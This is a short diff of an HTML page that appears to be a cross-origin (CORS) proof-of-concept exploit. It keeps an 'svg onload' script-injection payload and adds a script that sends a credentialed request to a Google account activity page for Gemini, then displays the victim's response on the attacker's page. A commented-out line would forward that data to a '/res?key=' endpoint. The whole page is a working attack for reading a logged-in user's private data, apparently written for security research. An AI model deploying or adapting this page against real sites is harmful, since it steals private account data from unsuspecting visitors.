@@ -6,10 +6,18 @@
     <title></title>
 </head>
 <body>
-    <h3>This is the testing page of c1ph3rxxx</h3>
-    <center> <div id="poc"></div></center>
-       
+    <h3>CORS POC</h3>
     <svg onload=alert(document.domain)>
-<!--     <script>alert(document.cookie)</script> -->
+    <center> <div id="poc"></div></center>
+    <script type="text/javascript">
+        const request = new XMLHttpRequest()
+        request.open("get", "https://myactivity.google.com/product/gemini?utm_source=gemini", true)
+        request.onload = ()=>{
+            // window.location.href = "/res?key=" + request.responseText
+            document.getElementById('poc').innerHTML= request.responseText;
+        }
+        request.withCredentials = true
+        request.send()
+    </script>
 </body>
 </html>
